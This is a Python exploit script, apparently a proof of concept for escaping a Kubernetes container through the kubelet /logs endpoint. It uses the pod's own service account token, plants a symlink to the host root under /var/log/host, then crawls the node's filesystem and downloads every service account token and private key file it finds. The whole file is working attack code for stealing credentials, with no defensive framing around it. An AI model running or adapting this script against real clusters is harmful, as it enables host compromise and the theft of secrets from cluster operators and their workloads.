import os
import sys
import requests
import urllib3
import netifaces
from bs4 import BeautifulSoup
import fnmatch
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_default_gateway():
    return netifaces.gateways()['default'][netifaces.AF_INET][0]

LOGS_URL = "https://{}:10250/logs".format(get_default_gateway())

def attach_to_root():
    os.symlink("/", "/var/log/host/root_link")

def detach_from_root():
    os.remove("/var/log/host/root_link")

def download_file(path, output_folder="./host_files"):
    file_path = "{}/{}".format(output_folder, path.replace('/', '.')[1:])[:-1]
    # maximum filename length
    file_path = file_path[:250] if len(file_path) > 250 else file_path
    with open(file_path, 'wb') as f:
        f.write(s.get(LOGS_URL+'/root_link/'+path).content)
    print("[*] extracted hostfile: {}".format(path))

def read_folder(path):
    soup = BeautifulSoup(s.get(LOGS_URL+'/root_link'+path).text, 'html.parser')
    for link in soup.find_all('a'):
        href = link.get('href')
        if href:
            yield href
    
def find_files(curr_folder, query, process_file=download_file):
    """function iterates web directory and downloads specific files"""
    excluded_folders = ("proc/")
    for line in read_folder(curr_folder):
        # continue iteration for folders
        full_path = curr_folder + line
        if line.endswith('/'):
            if not line.endswith(excluded_folders):
                find_files(full_path, query, process_file)
        # matched file, downloading
        elif fnmatch.fnmatch(line, query):
            process_file(full_path)

def extract_kuberenetes_tokens():
    """finds and downloads all token files found on the host"""
    duplicate_token_pattern = re.compile(r".*\.\.\d+_\d+_\d+_\d+_\d+_\d+\.\d+")
    def filtered_token(x):
        if not duplicate_token_pattern.match(x):
            download_file(x, output_folder='./host_files/tokens')       
    find_files("/var/lib/kubelet/pods/", query="token", process_file=filtered_token)

def extract_private_keys():
    """finds and downloads all private_key files found on the host"""
    def key_download(x):
        download_file(x, output_folder="./host_files/private_keys")
    find_files("/home/", query="*.key", process_file=key_download)
    find_files("/etc/", query="*.key", process_file=key_download)
    find_files("/var/lib/docker/", query="*.key", process_file=key_download)
    find_files("/usr/", query="*.key", process_file=key_download)

def exploit():
    try:
        print("[+] creating symlink to host root folder inside /var/log")
        attach_to_root()
        
        print("[*] fetching token files from host")
        extract_kuberenetes_tokens()

        print("[*] fetching private key files from host")
        extract_private_keys()
    
    except Exception as x:
        print("ERROR: {}".format(x))
    finally:
        print("[+] removing symlink to host root folder")
        detach_from_root()
        print("[*] Done. check the host_files folder for extracted root files.")    

if __name__ == "__main__":
    with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as tf:    
        token = tf.read()
    s = requests.session()
    s.verify = False
    s.headers.update({"Authorization": "Bearer {}".format(token)})
    if s.get(LOGS_URL).status_code != 200:
        print("[-] Cannot run exploit, no permissions to access /logs on the kubelet")
        sys.exit(1)
    print("[*] Got access to kubelet /logs endpoint")
    exploit()
